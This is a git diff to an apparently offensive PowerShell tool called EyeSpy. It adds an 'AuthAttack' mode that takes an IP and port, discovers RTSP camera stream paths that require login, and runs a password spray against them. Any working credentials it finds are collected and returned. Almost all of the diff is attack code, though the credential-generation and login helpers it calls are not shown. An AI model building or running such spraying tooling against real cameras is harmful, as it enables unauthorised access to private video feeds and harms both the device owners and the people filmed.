@@ -5,8 +5,11 @@ function EyeSpy {
         [String]$Search,
         [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
         [String]$NoAuth,
-        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
+        [Parameter(Mandatory = $False, ParameterSetName = 'AuthAttack')]
+        [ValidatePattern('^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4}:\b((6553[0-5])|(655[0-2][0-9])|(65[0-4][0-9]{2})|(6[0-4][0-9]{3})|([1-5][0-9]{4})|([0-5]{0,5})|([0-9]{1,4}))\b$')]
         [String]$AuthAttack,
+        [Parameter(Mandatory = $False, ParameterSetName = 'AuthAttack')]
+        [String]$Path,
         [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
         [String]$Auto,
         [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
@@ -76,6 +79,7 @@ function EyeSpy {
         return
     
     }
+
 
 $Banner
 
@@ -501,6 +505,92 @@ function NoAuthScan {
     Write-Host "=========================================================`r`n"
 }
 
+function AuthAttack {
+    [CmdletBinding()]
+    param (
+        [Parameter(Mandatory)]
+        [string]$Target,
+        [Parameter(Mandatory = $False)]
+        [string]$Path
+    )
+
+    $ipAndPort = $Target.Split(':')
+    $ip = $ipAndPort[0]
+    $port = $ipAndPort[1]
+    $cliaddress += [PSCustomObject]@{
+        IPAddress = $ip
+        Port      = $port
+        Status    = "Open"
+    }
+
+    if ($PSBoundParameters.ContainsKey('Path')) {
+        # -Path parameter is provided, create a PSCustomObject directly
+        $authRequiredPaths = [PSCustomObject]@{
+            IPAddress = $ip
+            Port      = $port
+            Path      = $Path
+        }
+    }
+    else {
+        # -Path parameter is not provided, use the default behavior
+        $authRequiredPaths = Get-ValidRTSPPaths -OpenPorts $cliaddress
+    }
+
+    $credentials = GenerateCreds
+
+    $validCredentials = @()
+
+    if ($authRequiredPaths -is [System.Array]) {
+        if ($authRequiredPaths.Count -gt 0) {
+            Write-Host "=========================================================`r`n"
+            Write-Host "Beginning Password Spray:`r`n"
+
+            $index = 0
+            while ($index -lt $authRequiredPaths.Count) {
+                $authPath = $authRequiredPaths[$index]
+                $result = Get-ValidRTSPCredential -IP $authPath.IPAddress -Port $authPath.Port -Path $authPath.Path -Credentials $credentials
+
+                if ($result.CredentialFound) {
+                    $validCredentials += [PSCustomObject]@{
+                        IPAddress   = $authPath.IPAddress
+                        Port        = $authPath.Port
+                        Path        = $authPath.Path
+                        Credentials = $result.Credential
+                    }
+
+                    # Remove the current IP:Port combination from the array
+                    $authRequiredPaths = $authRequiredPaths | Where-Object { ($_.IPAddress -ne $authPath.IPAddress) -or ($_.Port -ne $authPath.Port) }
+                }
+                else {
+                    $index++
+                }
+            }
+
+            return $validCredentials
+        }
+    }
+    else {
+        # $authRequiredPaths is a single object, handle it separately
+        $result = Get-ValidRTSPCredential -IP $authRequiredPaths.IPAddress -Port $authRequiredPaths.Port -Path $authRequiredPaths.Path -Credentials $credentials
+
+        if ($result.CredentialFound) {
+            $validCredentials += [PSCustomObject]@{
+                IPAddress   = $authRequiredPaths.IPAddress
+                Port        = $authRequiredPaths.Port
+                Path        = $authRequiredPaths.Path
+                Credentials = $result.Credential
+            }
+
+            return $validCredentials
+        }
+    }
+
+    Write-Host "=========================================================`r`n"
+    Write-Host "No authentication required, see results above.`r`n"
+    Write-Host "Scan completed.`r`n" -ForegroundColor Green
+    Write-Host "=========================================================`r`n"
+}
+
 function FullAuto {
     [CmdletBinding()]
     param (
@@ -556,6 +646,14 @@ if ($Search) {
 } elseif ($NoAuth){
 
     NoAuthScan -Targets $NoAuth
+
+} elseif ($AuthAttack){
+
+    if ($Path) {
+        AuthAttack -Target $AuthAttack -Path $Path
+    } else {
+        AuthAttack -Target $AuthAttack
+    }
 
 } elseif ($Auto){
 
